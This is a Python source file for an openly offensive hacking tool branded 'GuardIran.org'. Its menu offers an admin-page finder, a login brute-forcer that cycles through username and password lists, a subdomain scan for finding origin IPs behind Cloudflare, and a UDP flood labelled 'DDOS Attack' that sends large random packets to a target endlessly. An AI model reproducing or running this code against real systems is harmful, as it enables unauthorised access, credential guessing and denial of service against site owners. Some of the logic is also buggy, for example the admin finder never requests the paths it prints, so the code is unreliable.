##################################################
#modules
#################################################


from colorama import Fore,init
from pyfiglet import figlet_format as font
import os,sys,time,socket,requests,random
#################################################
# welcom
####################################################
# the admin finder
####################################################
try:
    def _Run_():
        try:
            admin=open('admin.txt').read().split()
            os.system('cls'or'clear')
            print(font('GuardIran.org'))
            url=input(Fore.LIGHTBLUE_EX+' [+] '+Fore.BLUE+'Enter URL from Target : ')

            if 'http' in url:
                pass
            elif 'http'not in url:
                url = ('http://'+url)
            for i in admin:
                ur = (url+'/'+i)
                start_send=requests.get(url)
                if start_send.status_code == 200:
                    print(Fore.GREEN+' [+] '+Fore.LIGHTGREEN_EX+'found : '+ur)
                else:
                   print(Fore.RED+' [-] not found '+ur) 
            os.close(admin)
        except:
            input(' [+] Press Enter to Exit . . .')
except:
    print('Run file again...')   
#######################################################
# the cracker
####################################################
try:
    def login():
        os.system('cls'or'clear')
        print(font('GuardIran.org'))
        url_login=input(Fore.LIGHTBLUE_EX+' [+] '+Fore.BLUE+'Enter URL from Target : ')
        print(' [1] my username list\n [2] defalt')
        use=input(' [+] enter the username list mode : ')
        if '1'in use:
            address=input(' Enter your username list : ')
            name=open(str(address)).read().split()
        elif '2' in use:
            name=open('usernames.txt').read().split()
        print(' [1] my password list\n [2] defalt')
        pas=input(' Enter your password list model : ')
        if '1' in pas:
            psd=input(' [+] Enter your password list address : ')
            passwd=open(str(psd)).read().split()
        elif '2'in pas:
            passwd=open('passlist.txt').read().split()
        elif 'http' in url_login:
                pass
        elif 'http'not in url_login:
            url_login = ('https://'+url_login)


        bk=requests.get(url_login)
        try:
            for a in name:
                for i in passwd:
                    start=requests.get(url_login,data={'username':a,'password':i})
                    if bk.text != start.text:
                        print(Fore.YELLOW+' [+]'+Fore.LIGHTGREEN_EX+f' True | {a} : {i}')
                    elif bk.text == start.text:
                        print(Fore.YELLOW+' [-]'+Fore.LIGHTRED_EX+f' False | {a} : {i}')
        except KeyboardInterrupt:
            input(' Press Enter to exit . . .')
except:
    print(Fore.RED+'\n [-] login error please try again')
################################################
# bypass cloud Flare
################################################
def bypass():
    os.system('cls'or'clear')
    print(font('GuardIran.org'))
    try:
        url_bypass=input(Fore.LIGHTBLUE_EX+' [+] '+Fore.BLUE+'Enter URL from Target : ')
        if 'https://'in url_bypass:
            url_bypass=url_bypass.replace('https://','')
        elif 'http://'in url_bypass:
            url_bypass=url_bypass.replace('http://','')
        elif 'http'not in url_bypass:
            pass
        elif None in url_bypass:
            input(' [-] you dont enter URL press enter to try again...')
            bypass()

        print(f'\n [~] the URL is : {url_bypass}\n [~] START...')
        time.sleep(3)
        sub=open('domin.txt').read().split()
        host_name = socket.gethostbyname('www.'+url_bypass)
        try:
            for s in sub:
                thehost=(str(s)+'.'+str(url_bypass))
                try:
                    re=requests.get('https://'+thehost)
                except KeyboardInterrupt:
                        input(' [~] press Enter to Exit...')
                except:
                    pass
                if re.status_code!=404:
                    try:
                        send=socket.gethostbyname(thehost)
                    except KeyboardInterrupt:
                        input(' [~] press Enter to Exit...')
                    except:
                        pass
                    if host_name !=send:
                        print(Fore.GREEN+' [+] '+thehost+' : '+send)
                    elif host_name==send:
                        pass
                else:
                    pass


        except KeyboardInterrupt:
            input(' [+] Press Enter to exit')
        #except socket.gaierror:
            #pass


        input(' [+] Press Enter to exit...')
    except KeyboardInterrupt:
        input(' Enter To exit ...')

################################################
# DDos
###############################################
def DDOS():
    os.system('cls'or'clear')
    print(font('GuardIran.org'))
    get=input(' [+] please Enter IP address : ')
    ip=socket.gethostbyname(str(get))
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#.sendto(byte())
    try:
        while True:    
            send=sock.sendto(random._urandom(40000),(ip,80))
            print(f' [+] send packet to {ip}:80')
    except KeyboardInterrupt:
       input(' [+] press enter to exit...')
################################################
#the inputs
################################################
while True:
    try:
        os.system('cls'or'clear')
        print(font('GuardIran.org'))
        print('\n   ___    creator=>https://guardiran.org/profiles/31337-sparta/    ___')
        time.sleep(4)
        num1=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'1'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' admin finder '
        num2=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'2'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' crack login page '
        num3=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'3'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' get orginal IP address and bypass cloud flare '
        num4=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'4'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' DDOS Attack '
        num5=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'99'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' Exit '

        print(f'\n{num1}\n{num2}\n{num3}\n{num4}\n{num5}')
        get=input(' sparta@guardiran:~# ')
        if '1' in get:
            _Run_()
        elif '2' in get:
            login()
        elif '3'in get:
            bypass()
        elif '4'in get:
            DDOS()
        elif get=='99':
            sys.exit()
    except KeyboardInterrupt:
        input('\n [+] press Enter to exit...')
        sys.exit()
    